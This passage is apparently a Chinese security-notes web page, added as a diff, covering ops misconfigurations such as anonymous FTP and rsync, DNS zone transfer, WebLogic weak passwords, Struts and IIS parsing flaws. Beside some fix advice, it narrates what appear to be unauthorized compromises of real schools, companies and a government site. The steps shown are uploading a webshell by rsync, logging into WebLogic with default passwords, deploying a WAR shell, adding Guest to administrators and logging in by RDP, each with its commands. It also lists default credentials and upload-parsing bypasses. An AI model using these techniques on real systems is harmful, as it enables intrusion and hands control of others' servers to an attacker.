+      &lt;li&gt;&lt;a href=&quot;#272-漏洞利用&quot; id=&quot;markdown-toc-272-漏洞利用&quot;&gt;27.2 漏洞利用&lt;/a&gt;&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#28-phpmyadmin弱口令&quot; id=&quot;markdown-toc-28-phpmyadmin弱口令&quot;&gt;28 phpmyadmin弱口令&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#29-mongodb配置不当&quot; id=&quot;markdown-toc-29-mongodb配置不当&quot;&gt;29 MongoDB配置不当&lt;/a&gt;    &lt;ul&gt;
+      &lt;li&gt;&lt;a href=&quot;#291-基本介绍&quot; id=&quot;markdown-toc-291-基本介绍&quot;&gt;29.1 基本介绍&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#292-未授权访问&quot; id=&quot;markdown-toc-292-未授权访问&quot;&gt;29.2 未授权访问&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#293-实战演练&quot; id=&quot;markdown-toc-293-实战演练&quot;&gt;29.3 实战演练&lt;/a&gt;&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#30-各种敏感后台对外开放&quot; id=&quot;markdown-toc-30-各种敏感后台对外开放&quot;&gt;30 各种敏感后台对外开放&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#31-django配置不当致信息泄露&quot; id=&quot;markdown-toc-31-django配置不当致信息泄露&quot;&gt;31 Django配置不当致信息泄露&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#32-redis未授权访问&quot; id=&quot;markdown-toc-32-redis未授权访问&quot;&gt;32 Redis未授权访问&lt;/a&gt;    &lt;ul&gt;
+      &lt;li&gt;&lt;a href=&quot;#321-基础知识&quot; id=&quot;markdown-toc-321-基础知识&quot;&gt;32.1 基础知识&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#322-利用方式&quot; id=&quot;markdown-toc-322-利用方式&quot;&gt;32.2 利用方式&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#323-实战演练&quot; id=&quot;markdown-toc-323-实战演练&quot;&gt;32.3 实战演练&lt;/a&gt;&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#33-ldap未授权访问&quot; id=&quot;markdown-toc-33-ldap未授权访问&quot;&gt;33 LDAP未授权访问&lt;/a&gt;    &lt;ul&gt;
+      &lt;li&gt;&lt;a href=&quot;#331-基础知识&quot; id=&quot;markdown-toc-331-基础知识&quot;&gt;33.1 基础知识&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#332-利用方式&quot; id=&quot;markdown-toc-332-利用方式&quot;&gt;33.2 利用方式&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#333-应用实例&quot; id=&quot;markdown-toc-333-应用实例&quot;&gt;33.3 应用实例&lt;/a&gt;&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#34-smb弱口令&quot; id=&quot;markdown-toc-34-smb弱口令&quot;&gt;34 SMB弱口令&lt;/a&gt;    &lt;ul&gt;
+      &lt;li&gt;&lt;a href=&quot;#341-smb字典&quot; id=&quot;markdown-toc-341-smb字典&quot;&gt;34.1 smb字典&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#342-ms08-067溢出&quot; id=&quot;markdown-toc-342-ms08-067溢出&quot;&gt;34.2 MS08-067溢出&lt;/a&gt;&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#35-openssl心脏出血&quot; id=&quot;markdown-toc-35-openssl心脏出血&quot;&gt;35 openssl心脏出血&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#36-squid代理默认端口&quot; id=&quot;markdown-toc-36-squid代理默认端口&quot;&gt;36 squid代理默认端口&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#37-glassfish-web中间件弱口令&quot; id=&quot;markdown-toc-37-glassfish-web中间件弱口令&quot;&gt;37 GlassFish web中间件弱口令&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#38-php-fastcgi远程利用&quot; id=&quot;markdown-toc-38-php-fastcgi远程利用&quot;&gt;38 PHP FastCGI远程利用&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#39-elasticsearch代码执行&quot; id=&quot;markdown-toc-39-elasticsearch代码执行&quot;&gt;39 elasticsearch代码执行&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#40-websphere-web中间件弱口令&quot; id=&quot;markdown-toc-40-websphere-web中间件弱口令&quot;&gt;40 websphere web中间件弱口令&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#41-zebra路由弱密码&quot; id=&quot;markdown-toc-41-zebra路由弱密码&quot;&gt;41 zebra路由弱密码&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#42-rundeck-web&quot; id=&quot;markdown-toc-42-rundeck-web&quot;&gt;42 rundeck web&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#43-dns未设置spf导致邮箱欺骗漏洞&quot; id=&quot;markdown-toc-43-dns未设置spf导致邮箱欺骗漏洞&quot;&gt;43 dns未设置spf导致邮箱欺骗漏洞&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#44-cvs源码泄露&quot; id=&quot;markdown-toc-44-cvs源码泄露&quot;&gt;44 CVS源码泄露&lt;/a&gt;    &lt;ul&gt;
+      &lt;li&gt;&lt;a href=&quot;#441-基础知识&quot; id=&quot;markdown-toc-441-基础知识&quot;&gt;44.1 基础知识&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#442-实例应用&quot; id=&quot;markdown-toc-442-实例应用&quot;&gt;44.2 实例应用&lt;/a&gt;&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#45-tomcat-examples-directory漏洞&quot; id=&quot;markdown-toc-45-tomcat-examples-directory漏洞&quot;&gt;45 Tomcat examples directory漏洞&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h1 id=&quot;0-readme&quot;&gt;0 Readme&lt;/h1&gt;
+
+&lt;p&gt;来源于网络，回馈于网络。&lt;/p&gt;
+
+&lt;p&gt;以前简单的记录下学习的笔记，现在轻轻地拿出来与大家分享。&lt;/p&gt;
+
+&lt;p&gt;这份paper没有太多个人思路，但却不失某一漏洞的利用方法及遇到的问题（当时有的没有解决，然而后来也没有继续补充）。&lt;/p&gt;
+
+&lt;p&gt;仅单纯的按照自己的思路，记录和总结常见的运维相关安全漏洞。难免会有错误与不足（包括不全面）之处，还请大家不吝赐教。&lt;/p&gt;
+
+&lt;h1 id=&quot;1-ftp匿名访问或弱口令&quot;&gt;1 ftp匿名访问或弱口令&lt;/h1&gt;
+
+&lt;h2 id=&quot;11-ftp匿名访问&quot;&gt;1.1 ftp匿名访问&lt;/h2&gt;
+
+&lt;p&gt;Username = anonymous &amp;amp;&amp;amp; password = (null )&lt;/p&gt;
+
+&lt;p&gt;（1）cmd下，ftp xx.xx.xx.xx&lt;/p&gt;
+
+&lt;p&gt;（2）文件夹，ftp://xx.xx.xx.xx&lt;/p&gt;
+
+&lt;h2 id=&quot;12-ftp常见弱口令&quot;&gt;1.2 ftp常见弱口令&lt;/h2&gt;
+
+&lt;p&gt;（1）从wooyun的漏洞案例中看来，常见的弱口令：&lt;/p&gt;
+
+&lt;p&gt;网站域名（例如baidu.com） &lt;code class=&quot;highlighter-rouge&quot;&gt;baidu / baidu&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;（2）从xx项目中（漏扫扫出），弱口令为：&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;ftp / ftp&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;（3）网站使用lampp套装，未修改默认ftp密码：&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;nobody / lampp&lt;/code&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;13-边学边用&quot;&gt;1.3 边学边用&lt;/h2&gt;
+
+&lt;p&gt;xx.xx.xx.xx 匿名访问 ftp / ftp
+均可以登录&lt;/p&gt;
+
+&lt;p&gt;使用8uftp登陆：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;\assets\img\安全运维\file_html_3d03e9ebaafe6524.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;在文件夹中直接输入地址登陆：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;\assets\img\安全运维\file_html_fc4bacc7b391f84f.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;比较两者之间的差异：前者下载文件会受到大小的限制，后者则不会。&lt;/p&gt;
+
+&lt;p&gt;xx.xx.xx.xx yy学校&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;\assets\img\安全运维\file_html_e8776ff5ccdeee62.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;xx.xx.xx.xx zz学校&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;\assets\img\安全运维\file_html_158b89f932faeb71.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h1 id=&quot;2-rsync匿名访问&quot;&gt;2 rsync匿名访问&lt;/h1&gt;
+
+&lt;p&gt;参考： drops.wooyun.org/papers/161&lt;/p&gt;
+
+&lt;p&gt;rsync是一个远程数据同步工具，用 “rsync
+算法”提供了一个客户机和远程文件服务器的文件同步的快速方法，在同步文件的同时，可以保持原来文件的权限、时间、软硬链接等附加信息。&lt;/p&gt;
+
+&lt;p&gt;下载文件：&lt;/p&gt;
+
+&lt;p&gt;./rsync -vzrtopg –progress
+–deleteusername@xxx.xxx.xxx.xxx::out
+/home/test/getfile&lt;/p&gt;
+
+&lt;p&gt;上传文件：&lt;/p&gt;
+
+&lt;p&gt;/user/bin/rsync -vzrtopg –progress
+/home/test/getfile&lt;/p&gt;
+
+&lt;h2 id=&quot;21-利用方法&quot;&gt;2.1 利用方法&lt;/h2&gt;
+
+&lt;p&gt;rsync
+默认端口是873，可使用nmap进行扫描：&lt;/p&gt;
+
+&lt;p&gt;nmap –n –open –p 873 x.x.x.x/24&lt;/p&gt;
+
+&lt;p&gt;尝试上传、下载文件( kali
+中)：&lt;/p&gt;
+
+&lt;p&gt;rsync 10.210.208.39::&lt;/p&gt;
+
+&lt;p&gt;或 rsync –vvvv
+rsync://10.210.208.39::&lt;/p&gt;
+
+&lt;h2 id=&quot;22-安全配置&quot;&gt;2.2 安全配置&lt;/h2&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;
+    &lt;p&gt;限定访问IP：IP
+Tables防火墙或修改配置文件rsync.conf&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;不允许匿名访问，添加用户口令&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;23-活学活用&quot;&gt;2.3 活学活用&lt;/h2&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;xx.xx.xx.xx 连接失败&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;\assets\img\安全运维\file_html_86a6c0dd0ec67cd3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;通信成功，却不知道该如何操作&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;\assets\img\安全运维\file_html_d6ea7f3e9ce65313.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;可以查看到目录，但是进一步访问需要密码&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;\assets\img\安全运维\file_html_93d8b6936279365a.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;可以查看到目录，但是禁止进一步访问&lt;/p&gt;
+
+&lt;p&gt;xx窝&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;\assets\img\安全运维\file_html_d416cd4216771f91.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;http://www.xxx.gov.cn xx局&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;rsync -v xx.xx.xx.xx::&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;\assets\img\安全运维\file_html_29db8cfd2f6f9255.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;上传webshell: # rsync -av /root/Desktop/youxiu.aspx
+xx.xx.xx.xx::Etest&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;\assets\img\安全运维\file_html_7ba40be2f34f1334.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;确认是否成功：# rsync -v xx.xx.xx.xx::Etest&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;\assets\img\安全运维\file_html_ac23219ff525104.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;获取wenshell: http://www.xx.cn/youxiu.aspx admin&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;\assets\img\安全运维\file_html_c97ac1aa5603d31e.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;xx.xx.xx.xx yy公司OA系统&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;\assets\img\安全运维\file_html_afd89947e3e3b0f4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h1 id=&quot;3-dns域传送漏洞&quot;&gt;3 DNS域传送漏洞&lt;/h1&gt;
+
+&lt;p&gt;参考： drops.wooyun.org/papers/64&lt;/p&gt;
+
+&lt;p&gt;DNS主备之间数据同步使用的是dns域传送，如果配置不当，就会导致匿名用户获取DNS服务器某一域的所有记录，将整个企业的基础业务以及网络架构对外暴露从而造成严重的信息泄露，甚至导致企业网络被渗透。&lt;/p&gt;
+
+&lt;h2 id=&quot;31-漏洞成因&quot;&gt;3.1 漏洞成因&lt;/h2&gt;
+
+&lt;p&gt;默认安装BIND
+，配置项中没有allow-transfer项，就会出现dns域传送
+漏洞&lt;/p&gt;
+
+&lt;p&gt;域传送关键配置项:&lt;/p&gt;
+
+&lt;p&gt;allow-transfer{ipaddress;};
+通过ip限制可进行域传送的服务器&lt;/p&gt;
+
+&lt;p&gt;allow-transfer{key transfer;};
+通过key限制可以进行域传送的服务器&lt;/p&gt;
+
+&lt;p&gt;设置方式有两种：&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;
+    &lt;p&gt;在option配置域&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;在zone配置域&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;优先级为： zone &amp;gt; option&lt;/p&gt;
+
+&lt;h2 id=&quot;32-攻击方式&quot;&gt;3.2 攻击方式&lt;/h2&gt;
+
+&lt;p&gt;恶意用户可以通过dns域传送获取被攻击域下所有的子域名。导致一些非公开域名（测试域名、内部域名）泄露。而此类域名的安全性相对较低，更容易遭受攻击者的攻击，比如内部测试机往往缺乏必要的安全设置。&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;dos下进行测试&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;C:\Users\ljn&amp;gt;nslookup
+
+&amp;gt; set type=ns
+
+&amp;gt; 12306.cn
+
+&amp;gt; server dns1.zdnscloud.biz
+
+&amp;gt; ls 12306.cn
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;kali中进行测试&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;\# dig @1.1.1.1 12306.cn axfr
+(1.1.1.1为dns服务器IP，12306.cn为测试域名)
+
+或 \# dnsenum 12306.cn
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;h2 id=&quot;33-修复方案&quot;&gt;3.3 修复方案&lt;/h2&gt;
+
+&lt;p&gt;只需在限制相应的zone、optio中添加allow-transfer限制可以进行同步的服务器，限制方式有两种:&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;限制IP&lt;/li&gt;
+  &lt;li&gt;使用key认证。&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h1 id=&quot;4-weblogic弱口令&quot;&gt;4 weblogic弱口令&lt;/h1&gt;
+
+&lt;p&gt;参考： drops.wooyun.org/tips/402&lt;/p&gt;
+
+&lt;h2 id=&quot;41-基本信息&quot;&gt;4.1 基本信息&lt;/h2&gt;
+
+&lt;p&gt;Weblogic是美国bea公司出品的一个application
+server（基于javaee架构的中间件），BEA
+Weblogic用于开发、集成、部署和管理大型分布式Web应用、网络应用和数据库应用的java应用服务器。&lt;/p&gt;
+
+&lt;p&gt;很多weblogic服务器安装时采用默认密码，攻击者很容易进入weblogic控制台获取相应权限。&lt;/p&gt;
+
+&lt;p&gt;默认weblogic管理员账号密码： &lt;code class=&quot;highlighter-rouge&quot;&gt;weblogic /
+weblogic&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;默认weblogic开放端口： 7001&lt;/p&gt;
+
+&lt;p&gt;默认weblogic访问路径：
+&lt;code class=&quot;highlighter-rouge&quot;&gt;http://xxxx:7001/console&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;从Default Passwords |
+CIRT.net获取常见weblogic默认密码：&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Oracle-WebLogic：weblogic / weblogic
+
+Oracle-WebLogic 11g：weblogic / welcome1 (实践)
+
+Oracle-WebLogic：system / password
+
+Oracle-Weblogic(Version: 9.0 Beta(Diablo))：weblogic / weblogic
+
+Oracle-WebLogic Process Integrator：admin / security
+
+Oracle-WebLogic Process Integrator：mary / password
+
+Oracle-WebLogic Process Integrator：joe / password
+
+Oracle-WebLogic Process Integrator：wlcsystem / wlcsystem
+
+Oracle-WebLogic Process Integrator：wlpisystem / wlpisystem
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;查看wooyun漏洞案例，积累常见弱口令：&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;weblogic / weblogic123
+
+weblogic / 12345678
+
+admin / 12345678
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;h2 id=&quot;42-利用方式&quot;&gt;4.2 利用方式&lt;/h2&gt;
+
+&lt;p&gt;寻找weblogic服务器方法：&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;
+    &lt;p&gt;使用 IIS PUT Scaner
+扫描80、8080端口，查看HTTP
+banner信息，确定为weblogic；&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;直接扫描7001端口或者baidu
+inurl: :7001/console (待尝试)&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;利用弱口令进入管理后台，在控制台部署一个web应用：&lt;/p&gt;
+
+&lt;p&gt;Deploy =&amp;gt; web application modules =&amp;gt; Deploy a new Web Application
+Module… =&amp;gt;upload your file(s) =&amp;gt; Deploy&lt;/p&gt;
+
+&lt;p&gt;在Web应用中包含模块：必须要有一个servlet或JSP
+web.xml文件，包含web应用程序的信息&lt;/p&gt;
+
+&lt;h2 id=&quot;43-安全配置&quot;&gt;4.3 安全配置&lt;/h2&gt;
+
+&lt;p&gt;http://download.oracle.com/docs/cd/E12890_01/ales/docs32/integrateappenviron/configWLS.html#wp1099454&lt;/p&gt;
+
+&lt;h2 id=&quot;44-现学现卖&quot;&gt;4.4 现学现卖&lt;/h2&gt;
+
+&lt;p&gt;http://xx.xx.xx.xx:7001/console/login/LoginForm.jsp&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;\assets\img\安全运维\file_html_a09bb089c1c3b312.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;weblogic / 12345678&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;\assets\img\安全运维\file_html_6d6c9016367bb35b.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;部署war包（war包其实是index.jsp + META-INF + WEB-INF的压缩包）：&lt;/p&gt;
+
+&lt;p&gt;先制作war包（需安装java环境）：&lt;/p&gt;
+
+&lt;p&gt;c:\app&amp;gt;cd c:/program files/java/dk1.8.0_31/bin&lt;/p&gt;
+
+&lt;p&gt;c:\Program Files\Java\jdk1.8.0_31\bin&amp;gt;jar -cvf app.war c:/app&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;\assets\img\安全运维\file_html_3493c9640cf370ac.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;\assets\img\安全运维\file_html_ba1e3acff7df0d95.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;部署——&amp;gt;安装——&amp;gt;上载文件——&amp;gt;一直点确定即可，得到shell&lt;/p&gt;
+
+&lt;p&gt;（自己制作war包失败，重新下载了一个war包，上传）&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;http://xx.xx.xx.xx:7001/index/a.jsp&quot;&gt;http://xx.xx.xx.xx:7001/index/a.jsp&lt;/a&gt; (安全起见，已删除)&lt;/p&gt;
+
+&lt;p&gt;http://xx.xx.xx.xx:7001/index/a.jsp?sort=1&amp;amp;dir=E%3A\phpstudy\WWW&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;\assets\img\安全运维\file_html_cf68ba09dbca62df.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;翻目录：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;\assets\img\安全运维\file_html_63592e979d64fae2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;http://xx.xx.xx.xx/weimall&quot;&gt;http://xx.xx.xx.xx/weimall&lt;/a&gt; mall.xx.cn v.xx.cn&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;\assets\img\安全运维\file_html_b9a7ba7d2ab3078c.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;http://xx.xx.xx.xx/fenxiao/&quot;&gt;http://xx.xx.xx.xx/fenxiao/&lt;/a&gt; 米某网&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;http://xx.x.xx.xx/fenxiao/api/client/uc.php&quot;&gt;http://xx.x.xx.xx/fenxiao/api/client/uc.php&lt;/a&gt; youxiu
+（已修改时间，该shell好用）&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;net user&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;\assets\img\安全运维\file_html_d3ed608fe971124a.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;net user Guest xiuyou!&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;\assets\img\安全运维\file_html_6ea978c38fc505e6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;net localgroup administrators&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;\assets\img\安全运维\file_html_eae0acb1c41ca212.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;net localgroup administrators Guest /add&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;\assets\img\安全运维\file_html_60b78b69da695ec6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;\assets\img\安全运维\file_html_30d1210394b8be38.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;mstsc打开远程终端，&lt;code class=&quot;highlighter-rouge&quot;&gt;Guest / xiuyou!&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;\assets\img\安全运维\file_html_f8671774fb643b0f.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;激活Guest用户 &lt;code class=&quot;highlighter-rouge&quot;&gt;net user Guest /active:yes&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;\assets\img\安全运维\file_html_880a526fcaa8650a.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;\assets\img\安全运维\file_html_25d3715c70e27e3d.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;\assets\img\安全运维\file_html_790c103cd138a9e2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h1 id=&quot;5-struts漏洞&quot;&gt;5 struts漏洞&lt;/h1&gt;
+
+&lt;p&gt;drops.wooyun.org/papers/902&lt;/p&gt;
+
+&lt;p&gt;sebug.net/appdir/Apache+Struts&lt;/p&gt;
+
+&lt;p&gt;Struts是Apache软件基金会Jakarta项目组的一个开源项目，它采用MVC模式，帮助java开发者利用J2EE开发Web应用，可以用来构件复杂的Web应用。它允许我们分解一个应用程序的商业逻辑、控制逻辑和表现逻辑的代码，使它的重用性和维护性更好。&lt;/p&gt;
+
+&lt;h2 id=&quot;51-s2-016命令执行漏洞&quot;&gt;5.1 S2-016命令执行漏洞&lt;/h2&gt;
+
+&lt;p&gt;在struts2中，DefaultActionMapper类支持以”action:”、”redirect:”、”redirectAction:”作为导航或是重定向前缀，但是这些前缀后面同时可以跟OGNL表达式，由于struts2没有对这些前缀做过滤，导致利用OGNL表达式调用java静态方法执行任意系统命令。redirect:和redirectAction:此两项前缀为Struts默认开启功能，目前Struts
+2.3.15.1以下版本均存在此漏洞。&lt;/p&gt;
+
+&lt;h2 id=&quot;52-s2-017重定向漏洞&quot;&gt;5.2 S2-017重定向漏洞&lt;/h2&gt;
+
+&lt;p&gt;Apache Struts
+2.0.0没有有效过滤”redirect:”/”redirectAction:”参数前缀内容，存在多个开放重定向漏洞，攻击者通过构建特制的URI并诱使用户点击，利用这些漏洞将这些用户重定向到攻击者控制的站点，执行钓鱼攻击。&lt;/p&gt;
+
+&lt;h2 id=&quot;53-s2-019命令执行漏洞&quot;&gt;5.3 S2-019命令执行漏洞&lt;/h2&gt;
+
+&lt;p&gt;Struts2 是第二代基于Model-View-Controller
+(MVC)模型的java企业级web应用框架。Apache
+Struts 2.3.15.2之前版本的“Dynamic Method
+Invocation”机制是默认开启的，仅提醒用户如果可能的情况下关闭此机制，这样就存在远程代码执行漏洞，远程攻击者可利用此漏洞在受影响应用上下文中执行任意代码。&lt;/p&gt;
+
+&lt;h1 id=&quot;6-web服务器解析漏洞&quot;&gt;6 web服务器解析漏洞&lt;/h1&gt;
+
+&lt;p&gt;www.cnseay.com/806/&lt;/p&gt;
+
+&lt;h2 id=&quot;61-iis-60&quot;&gt;6.1 IIS 6.0&lt;/h2&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;
+    &lt;p&gt;后缀解析： /xx.asp;.jpg&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;目录解析： /xx.asp/xx.jpg
+（xx.asp目录下可解析任何文件）&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;默认解析： xx.asa xx.cer xx.cdx
+（IIS默认配置中，该类文件由asp.dll解析）&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;发散思维： /xx.asa/xx.jpg /xx.cer/xx.jpg /xx.cdx/xx.jpg&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;62-iis-70iis-75nginx0837&quot;&gt;6.2 IIS 7.0/IIS 7.5/Nginx&amp;lt;=0.8.37&lt;/h2&gt;
+
+&lt;p&gt;默认Fast-CGI开启状况下，在文件路径（/xx.jpg）后加上/xx.php，即/xx.jpg/xx.php会被解析为php文件。&lt;/p&gt;
+
+&lt;p&gt;xx.jpg为一句话图片马，制作过程如下：&lt;/p&gt;
+
